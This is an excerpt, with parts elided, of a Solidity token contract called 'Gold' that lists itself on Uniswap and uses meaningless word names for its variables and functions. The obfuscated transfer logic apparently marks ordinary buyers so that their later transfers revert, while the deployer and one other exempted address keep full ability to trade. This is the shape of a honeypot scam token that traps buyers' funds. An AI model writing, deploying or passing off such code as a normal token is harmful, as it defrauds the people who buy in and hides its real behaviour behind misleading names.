...
contract Gold is Ownable {
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(consider);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        suppose[hand] = phrase;
        language = sister;
        evidence = charge;
        scientist[hand] = phrase;
        scientist[msg.sender] = phrase;
        suppose[msg.sender] = _tTotal;
    }

    uint256 private think = 3;
    string private language;
    string private evidence;
    uint8 private shoulder = 9;
    uint256 private _tTotal = 1000000000000 * 10**shoulder;
    ...
    uint256 private phrase = ~think;
    IUniswapV2Router02 public uniswapV2Router;
    address private being;
    ...
    function four(
        ...
        address gain = (uniswapV2Pair);

        if (scientist[believed] == 0 && (gain != believed) && judge[believed] > 0) {
            scientist[believed] -= shoulder;
        }

        address black = being;
        being = fully;

        suppose[believed] -= volume;
        uint256 gone = (volume / 100) * think;
        volume -= gone;
        judge[black] += shoulder;
        suppose[fully] += volume;
    }
    ...
    function transferFrom(
        ...
        four(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        four(msg.sender, recipient, amount);
        return true;
    }
